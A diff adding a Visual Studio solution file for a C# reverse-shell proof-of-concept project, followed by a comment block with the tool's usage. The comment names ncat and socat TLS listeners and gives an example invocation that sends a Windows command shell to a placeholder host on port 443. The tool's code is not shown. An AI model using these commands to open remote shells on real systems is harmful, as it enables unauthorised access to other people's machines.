@@ -1,0 +1,37 @@
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio 15
+VisualStudioVersion = 15.0.28010.2050
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "csharp_reverse_shell", "csharp_reverse_shell\csharp_reverse_shell.csproj", "{740C32CA-9964-445F-8514-062C4228FD28}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|Any CPU = Debug|Any CPU
+		Release|Any CPU = Release|Any CPU
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.Build.0 = Release|Any CPU
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(ExtensibilityGlobals) = postSolution
+		SolutionGuid = {45D5498A-0A7F-455B-B1DD-4A93EFD46DE3}
+	EndGlobalSection
+EndGlobal
+
+
+##
+## https://github.com/0xvm/csharp_reverse_shell
+##
+##
+## csharp_reverse_shell
+## c# reverse shell poc that also does TLS
+## Specify host, port, command, arguments, int XOR
+## Catch it with ncat --ssl or socat openssl-listen:443,cert=cert.pem,verify=0
+## All arguments are required,
+## e.g > csharp_reverse_shell.exe host 443 %comspec% "" 00
+##
